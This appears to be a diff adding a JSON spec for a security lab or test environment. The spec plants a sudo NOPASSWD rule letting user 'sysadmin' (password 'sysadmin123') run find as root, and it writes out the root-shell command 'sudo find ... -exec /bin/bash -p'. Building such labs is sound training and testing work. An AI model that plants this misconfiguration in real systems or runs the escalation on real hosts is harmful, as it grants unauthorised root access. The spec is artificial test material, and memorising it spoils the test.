@@ -1,0 +1,15 @@
+{
+  "summary": "Sudo NOPASSWD misconfiguration allowing low-privilege user to escalate to root via an allowed binary",
+  "runtime": "ubuntu",
+  "app_description": "",
+  "endpoints": [],
+  "vulnerability_placement": "The user 'sysadmin' is configured in /etc/sudoers with a NOPASSWD entry allowing execution of /usr/bin/find as root. This is set up via a sudoers drop-in file at /etc/sudoers.d/sysadmin with the line: 'sysadmin ALL=(root) NOPASSWD: /usr/bin/find'. The find binary supports a -exec flag that can be used to execute arbitrary commands as root, making this a trivial privilege escalation. The setup script creates the sysadmin user with a known password, installs the sudoers entry, and ensures find is present on the system.",
+  "data_model": {
+    "tables": []
+  },
+  "attack_entry_point": "sudo find /. -maxdepth 0 -exec /bin/bash -p \\; -quit",
+  "success_indicator": "uid=0(root)",
+  "extra_npm_packages": [],
+  "extra_pip_packages": [],
+  "notes": "Setup bash script should: (1) create user 'sysadmin' with password 'sysadmin123' via `useradd -m -s /bin/bash sysadmin && echo 'sysadmin:sysadmin123' | chpasswd`; (2) write the sudoers drop-in file: `echo 'sysadmin ALL=(root) NOPASSWD: /usr/bin/find' > /etc/sudoers.d/sysadmin && chmod 0440 /etc/sudoers.d/sysadmin`; (3) ensure /usr/bin/find is installed (`apt-get install -y findutils`). The attacker, once logged in as sysadmin via SSH, runs `sudo -l` to discover the entry, then exploits it with `sudo find /. -maxdepth 0 -exec /bin/bash -p \\; -quit` and verifies root with `id`."
+}
